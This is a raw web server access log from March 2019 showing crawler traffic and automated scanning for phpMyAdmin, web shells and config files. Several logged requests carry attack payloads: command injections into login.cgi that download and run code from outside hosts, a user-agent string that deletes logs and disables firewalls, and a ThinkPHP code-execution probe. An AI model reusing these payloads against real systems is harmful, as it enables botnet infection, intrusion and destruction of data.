129.211.119.191 - - [24/Mar/2019:15:27:36 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:38 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:40 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:41 +0000] "GET /pma-old/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:41 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:44 +0000] "GET /phpma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:46 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:48 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:49 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:49 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:52 +0000] "GET /v/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:54 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:56 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:27:57 +0000] "GET /shaAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:00 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:01 +0000] "GET /s/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:01 +0000] "GET /MyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:02 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:04 +0000] "GET /phpMyAdmin123/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:05 +0000] "GET /pwd/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:06 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:08 +0000] "GET /phpMydmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:09 +0000] "GET /phpMyAdmins/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:11 +0000] "GET /phpMyAdmin._/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:12 +0000] "GET /phpmyadmin2222/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:14 +0000] "GET /php2MyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:16 +0000] "GET /phpiMyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:17 +0000] "GET /phpNyAdmin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:18 +0000] "GET /program/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:20 +0000] "GET /phppma/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:21 +0000] "GET /phpmy/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:22 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:24 +0000] "GET /mysql/sqlmanager/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:25 +0000] "GET /mysql/mysqlmanager/index.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
129.211.119.191 - - [24/Mar/2019:15:28:28 +0000] "GET /manager/html HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0"
95.216.96.245 - - [24/Mar/2019:15:32:14 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:14 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:15 +0000] "GET / HTTP/1.1" 200 2180 "-" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:15 +0000] "GET / HTTP/1.1" 200 2170 "-" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:16 +0000] "GET /forgot-password HTTP/1.1" 200 2054 "http://www.veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:16 +0000] "GET /forgot-password HTTP/1.1" 200 2050 "http://veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:17 +0000] "GET /signup HTTP/1.1" 200 2821 "http://www.veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:17 +0000] "GET /signup HTTP/1.1" 200 2813 "http://veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:18 +0000] "GET /anonymous-signup HTTP/1.1" 200 2176 "http://www.veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:18 +0000] "GET /anonymous-signup HTTP/1.1" 200 2178 "http://veronarisuona.it/" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:19 +0000] "GET /login HTTP/1.1" 200 2172 "http://www.veronarisuona.it/signup" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
95.216.96.245 - - [24/Mar/2019:15:32:19 +0000] "GET /login HTTP/1.1" 200 2180 "http://veronarisuona.it/signup" "Mozilla/5.0 (compatible; SEOkicks; +https://www.seokicks.de/robot.html)"
180.76.15.30 - - [24/Mar/2019:15:45:03 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.33 - - [24/Mar/2019:15:45:04 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
178.154.171.33 - - [24/Mar/2019:16:08:08 +0000] "GET /robots.txt HTTP/1.1" 200 271 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.154.171.33 - - [24/Mar/2019:16:08:12 +0000] "GET /login HTTP/1.1" 200 2168 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
60.191.38.77 - - [24/Mar/2019:16:13:20 +0000] "GET / HTTP/1.1" 200 6460 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
68.232.62.69 - - [24/Mar/2019:16:34:27 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://157.230.118.219/cayo1%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0;rm -rf /tmp/* /var/* /var/run/* /var/tmp/*;rm -rf /var/log/wtmp;rm -rf ~/.bash_history;history -c;history -w;rm -rf /tmp/*;history -c;rm -rf /bin/netstat;history -w;pkill -9 busybox;pkill -9 perl;service iptables stop;/sbin/iptables -F;/sbin/iptables -X;service firewalld stop;"
95.104.116.174 - - [24/Mar/2019:16:51:14 +0000] "GET / HTTP/1.1" 200 6074 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
119.73.133.87 - - [24/Mar/2019:16:59:39 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://147.135.121.113/d%20-O%20-%3E%20/tmp/ff;chmod%20+x%20/tmp/ff;sh%20/tmp/ff%27$ HTTP/1.1" 400 0 "-" "Hello, World/2.0"
176.32.33.145 - - [24/Mar/2019:17:21:40 +0000] "\x16\x03\x01" 400 0 "-" "-"
176.32.33.145 - - [24/Mar/2019:17:21:40 +0000] "GET //vtigercrm/vtigerservice.php HTTP/1.1" 404 10533 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
176.32.33.145 - - [24/Mar/2019:17:40:43 +0000] "GET //a2billing/customer/templates/default/footer.tpl HTTP/1.1" 404 10533 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
176.32.33.145 - - [24/Mar/2019:17:40:44 +0000] "\x16\x03\x01" 400 0 "-" "-"
176.32.33.145 - - [24/Mar/2019:17:56:38 +0000] "GET //admin/config.php HTTP/1.1" 404 10533 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
176.32.33.145 - - [24/Mar/2019:17:56:39 +0000] "\x16\x03\x01" 400 0 "-" "-"
176.32.33.145 - - [24/Mar/2019:18:12:42 +0000] "GET //about.php HTTP/1.1" 404 10533 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64"
176.32.33.145 - - [24/Mar/2019:18:12:42 +0000] "\x16\x03\x01" 400 0 "-" "-"
172.245.227.252 - - [24/Mar/2019:18:44:55 +0000] "GET /air-jordan-2-uk/ HTTP/1.1" 404 10547 "http://www.veronarisuona.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecho) Chrome/51.0.2704.84 Safari/537.36"
172.245.227.252 - - [24/Mar/2019:18:44:56 +0000] "GET / HTTP/1.1" 200 2173 "http://www.veronarisuona.it" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecho) Chrome/51.0.2704.84 Safari/537.36"
181.191.228.48 - - [24/Mar/2019:19:35:09 +0000] "GET / HTTP/1.1" 200 6070 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.124.15.48 - - [24/Mar/2019:19:45:49 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://147.135.121.113/d%20-O%20-%3E%20/tmp/ff;chmod%20+x%20/tmp/ff;sh%20/tmp/ff%27$ HTTP/1.1" 400 0 "-" "Hello, World/2.0"
216.245.197.254 - - [24/Mar/2019:19:47:02 +0000] "HEAD /robots.txt HTTP/1.0" 200 247 "-" "-"
83.48.23.182 - - [24/Mar/2019:19:48:28 +0000] "GET / HTTP/1.1" 200 6074 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
122.114.254.38 - - [24/Mar/2019:20:43:53 +0000] "POST /App56fd47d4.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
122.114.254.38 - - [24/Mar/2019:20:43:54 +0000] "PROPFIND / HTTP/1.1" 405 330952 "-" "-"
122.114.254.38 - - [24/Mar/2019:20:43:56 +0000] "GET /webdav/ HTTP/1.1" 404 10533 "-" "Mozilla/5.0"
122.114.254.38 - - [24/Mar/2019:20:43:58 +0000] "GET /java.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:43:59 +0000] "GET /_query.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:43:58 +0000] "PROPFIND / HTTP/1.1" 405 330927 "-" "-"
122.114.254.38 - - [24/Mar/2019:20:44:00 +0000] "GET /test.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:03 +0000] "GET /db_pma.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:04 +0000] "GET /logon.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:04 +0000] "GET /webdav/ HTTP/1.1" 404 10533 "-" "Mozilla/5.0"
103.230.241.81 - - [24/Mar/2019:20:44:05 +0000] "GET /help.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:06 +0000] "GET /license.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:06 +0000] "GET /java.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:07 +0000] "GET /log.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:07 +0000] "GET /hell.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:08 +0000] "GET /pmd_online.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:08 +0000] "GET /x.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:10 +0000] "GET /_query.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:10 +0000] "GET /shell.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:11 +0000] "GET /htdocs.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:12 +0000] "GET /desktop.ini.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:13 +0000] "GET /test.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:44:17 +0000] "GET /db_cts.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:18 +0000] "GET /lala-dpr.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:19 +0000] "GET /wpc.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:19 +0000] "GET /wpo.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:20 +0000] "GET /t6nv.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:20 +0000] "GET /muhstik.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:21 +0000] "GET /db_pma.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:22 +0000] "GET /text.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:23 +0000] "GET /wp-config.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:23 +0000] "GET /muhstik.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:26 +0000] "GET /logon.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:26 +0000] "GET /muhstiks.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:26 +0000] "GET /help-e.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:27 +0000] "GET /muhstik-dpr.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:28 +0000] "GET /lol.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:30 +0000] "GET /license.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:30 +0000] "GET /cmd.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:30 +0000] "GET /log.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:31 +0000] "GET /cmv.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:31 +0000] "GET /cmdd.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:33 +0000] "GET /hell.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:34 +0000] "GET /cmd.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:35 +0000] "GET /shell.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:35 +0000] "GET /appserv.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:36 +0000] "GET /scripts/setup.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:36 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:37 +0000] "GET /pmd_online.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:38 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:39 +0000] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:39 +0000] "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:40 +0000] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:40 +0000] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:40 +0000] "GET /x.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:44:41 +0000] "GET /shell.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:42 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 200 6074 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:42 +0000] "GET /htdocs.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:43 +0000] "GET /d7.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:43 +0000] "GET /desktop.ini.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:43 +0000] "GET /rxr.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
103.230.241.81 - - [24/Mar/2019:20:44:44 +0000] "GET /z.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
103.230.241.81 - - [24/Mar/2019:20:44:45 +0000] "GET /lala.php HTTP/1.1" 404 10533 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
122.114.254.38 - - [24/Mar/2019:20:44:46 +0000] "GET /home.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
122.114.254.38 - - [24/Mar/2019:20:44:47 +0000] "GET /undx.php HTTP/1.1" 404 10533 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
